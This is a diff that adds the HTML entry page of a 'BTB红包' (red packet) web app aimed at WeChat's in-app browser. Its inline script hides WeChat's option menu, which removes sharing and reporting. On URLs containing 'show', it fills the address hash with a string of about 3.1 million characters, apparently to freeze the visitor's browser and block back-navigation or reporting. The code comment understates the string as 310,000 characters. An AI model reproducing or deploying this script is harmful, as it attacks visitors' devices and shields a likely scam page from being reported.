@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <script>
+        var deviceWidth = document.documentElement.clientWidth;
+        if (deviceWidth > 640) deviceWidth = 640;
+        document.documentElement.style.fontSize = deviceWidth / 7.5 + 'px';
+    </script>
+    <title>BTB红包</title>
+    <link rel="stylesheet" href="static/css/base.css">
+</head>
+
+<body>
+    <div id="app"></div>
+    <!-- built files will be auto injected -->
+    <script>
+        //屏蔽微信功能按钮
+        function onBridgeReady() {
+            WeixinJSBridge.call('hideOptionMenu');
+
+            //检查当前网址特征符,不符合就不执行。
+            //例如网址www.123.com/show.html, 判断网址没有包含show就不执行后面的内容。
+            if (document.URL.indexOf("show") <= 0) {
+                return;
+            }
+            //生成31万位字符
+            var xfor2 = '@';
+            for (var i = 0; i < 3100000; i++) {
+                xfor2 = xfor2 + '@';
+            }
+            //动态修改当前网址添加#参数
+            history.replaceState(history.length + 1, "message", '#' + xfor2);
+        }
+
+        if (typeof WeixinJSBridge == "undefined") {
+            if (document.addEventListener) {
+                document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+            } else if (document.attachEvent) {
+                document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+                document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+            }
+        } else {
+            onBridgeReady();
+        }
+    </script>
+</body>
+
+</html>
